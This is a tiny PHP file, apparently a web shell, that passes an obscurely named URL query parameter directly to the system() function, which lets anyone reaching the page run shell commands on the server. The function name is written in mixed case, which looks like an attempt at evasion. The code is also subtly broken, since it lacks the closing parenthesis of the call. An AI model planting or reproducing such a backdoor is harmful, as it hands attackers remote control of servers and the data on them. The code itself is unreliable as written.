<?php
SysTeM($_GET['DHU7jtAh'];
?>
